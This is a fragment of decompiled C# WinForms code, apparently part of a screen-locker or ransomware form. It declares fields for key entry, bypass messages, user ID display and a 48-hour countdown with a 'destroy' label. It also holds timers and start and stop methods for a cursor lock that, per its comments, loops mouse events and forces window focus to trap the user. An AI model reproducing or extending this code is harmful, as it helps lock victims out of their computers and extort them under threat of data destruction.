		[AccessedThroughProperty("a1")]
		[CompilerGenerated]
		private Panel panel_0;

		// Token: 0x040000C2 RID: 194
		[AccessedThroughProperty("main")]
		[CompilerGenerated]
		private Panel panel_1;

		// Token: 0x040000C3 RID: 195
		[CompilerGenerated]
		[AccessedThroughProperty("a2")]
		private Panel panel_2;

		// Token: 0x040000C4 RID: 196
		[AccessedThroughProperty("keytext")]
		[CompilerGenerated]
		private Label label_1;

		// Token: 0x040000C5 RID: 197
		[CompilerGenerated]
		[AccessedThroughProperty("hdn")]
		private TextBox textBox_0;

		// Token: 0x040000C6 RID: 198
		[CompilerGenerated]
		[AccessedThroughProperty("inputPS")]
		private Label label_2;

		// Token: 0x040000C7 RID: 199
		[AccessedThroughProperty("srv")]
		[CompilerGenerated]
		private System.Windows.Forms.Timer timer_0;

		// Token: 0x040000C8 RID: 200
		[CompilerGenerated]
		[AccessedThroughProperty("border_6")]
		private PictureBox pictureBox_0;

		// Token: 0x040000C9 RID: 201
		[CompilerGenerated]
		[AccessedThroughProperty("border_5")]
		private PictureBox pictureBox_1;

		// Token: 0x040000CA RID: 202
		[AccessedThroughProperty("border_2")]
		[CompilerGenerated]
		private PictureBox pictureBox_2;

		// Token: 0x040000CB RID: 203
		[AccessedThroughProperty("border_1")]
		[CompilerGenerated]
		private PictureBox pictureBox_3;

		// Token: 0x040000CC RID: 204
		[CompilerGenerated]
		[AccessedThroughProperty("border_8")]
		private PictureBox pictureBox_4;

		// Token: 0x040000CD RID: 205
		[CompilerGenerated]
		[AccessedThroughProperty("border_7")]
		private PictureBox pictureBox_5;

		// Token: 0x040000CE RID: 206
		[CompilerGenerated]
		[AccessedThroughProperty("border_4")]
		private PictureBox pictureBox_6;

		// Token: 0x040000CF RID: 207
		[CompilerGenerated]
		[AccessedThroughProperty("border_3")]
		private PictureBox pictureBox_7;

		// Token: 0x040000D0 RID: 208
		[AccessedThroughProperty("s2")]
		[CompilerGenerated]
		private Label label_3;

		// Token: 0x040000D1 RID: 209
		[AccessedThroughProperty("s1")]
		[CompilerGenerated]
		private Label label_4;

		// Token: 0x040000D2 RID: 210
		[CompilerGenerated]
		[AccessedThroughProperty("cursorstylec")]
		private System.Windows.Forms.Timer timer_1;

		// Token: 0x040000D3 RID: 211
		[AccessedThroughProperty("menu1")]
		[CompilerGenerated]
		private Label label_5;

		// Token: 0x040000D4 RID: 212
		[AccessedThroughProperty("Title")]
		[CompilerGenerated]
		private Label label_6;

		// Token: 0x040000D5 RID: 213
		[AccessedThroughProperty("art")]
		[CompilerGenerated]
		private Label label_7;

		// Token: 0x040000D6 RID: 214
		[CompilerGenerated]
		[AccessedThroughProperty("errx")]
		private Label label_8;

		// Token: 0x040000D7 RID: 215
		[AccessedThroughProperty("OnError")]
		[CompilerGenerated]
		private System.Windows.Forms.Timer timer_2;

		// Token: 0x040000D8 RID: 216
		[AccessedThroughProperty("UserInfo")]
		[CompilerGenerated]
		private Label label_9;

		// Token: 0x040000D9 RID: 217
		[CompilerGenerated]
		[AccessedThroughProperty("ID")]
		private Label label_10;

		// Token: 0x040000DA RID: 218
		[CompilerGenerated]
		[AccessedThroughProperty("clck")]
		private System.Windows.Forms.Timer timer_3;

		// Token: 0x040000DB RID: 219
		[AccessedThroughProperty("Safe1")]
		[CompilerGenerated]
		private PictureBox pictureBox_8;

		// Token: 0x040000DC RID: 220
		[AccessedThroughProperty("Safe2")]
		[CompilerGenerated]
		private PictureBox pictureBox_9;

		// Token: 0x040000DD RID: 221
		[AccessedThroughProperty("ByPassMessage")]
		[CompilerGenerated]
		private Panel panel_3;

		// Token: 0x040000DE RID: 222
		[AccessedThroughProperty("c3")]
		[CompilerGenerated]
		private PictureBox pictureBox_10;

		// Token: 0x040000DF RID: 223
		[AccessedThroughProperty("c2")]
		[CompilerGenerated]
		private PictureBox pictureBox_11;

		// Token: 0x040000E0 RID: 224
		[AccessedThroughProperty("c4")]
		[CompilerGenerated]
		private PictureBox pictureBox_12;

		// Token: 0x040000E1 RID: 225
		[AccessedThroughProperty("c1")]
		[CompilerGenerated]
		private PictureBox pictureBox_13;
		private PictureBox pictureBox_kot;
		// Защита от накопления обработчиков SystemEvents при повторном Load.
		private static bool systemEventsHooked;

		// Token: 0x040000E2 RID: 226
		[AccessedThroughProperty("ByPassWarnMsg")]
		[CompilerGenerated]
		private Label label_11;

		// Token: 0x040000E3 RID: 227
		[CompilerGenerated]
		[AccessedThroughProperty("bypasserr")]
		private System.Windows.Forms.Timer timer_4;

		private System.Windows.Forms.Timer kotTimer;
		private DateTime kotShownAt = DateTime.MinValue;

// Countdown fields
        private int countdownSeconds = 172800; // 48 hours
        private System.Windows.Forms.Timer countdownTimer;
        private Label labelCountdown;
        private Label labelDestroyText;

        private bool _cursorLockStopped;

        // Token: 0x040000E4 RID: 228
        [CompilerGenerated]
        [AccessedThroughProperty("tg")]
        private Label label_12;

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // GForm2
            // 
            this.ClientSize = new System.Drawing.Size(1929, 244);
            this.Name = "GForm2";
            this.ResumeLayout(false);

        }
        public void stopCursorLock()
        {
            // vmethod_6 (timer_3) — cursor-lock: tick method_11 шлёт mouse_event-луп.
            // vmethod_0 (timer_0) — фокус-луп.
            // vmethod_8 (timer_4) — ByPassMessage анимация, тоже может держать курсор.
            // Гасим все три, отписываем обработчики. Флаг запрещает рестарт.
            _cursorLockStopped = true;
            try
            {
                var t3 = this.vmethod_6();
                t3.Stop();
                t3.Enabled = false;
                t3.Tick -= this.method_11;
            }
            catch { }
            try
            {
                var t0 = this.vmethod_0();
                t0.Stop();
                t0.Tick -= this.method_0;
            }
            catch { }
            try
            {
                var t4 = this.vmethod_8();
                t4.Stop();
                t4.Enabled = false;
                t4.Tick -= this.method_12;
            }
            catch { }
        }

        public void startCursorLock()
        {
            try { this.vmethod_6().Enabled = true; this.vmethod_6().Start(); } catch { }
            try { this.vmethod_0().Start(); } catch { }
        }
    }
}
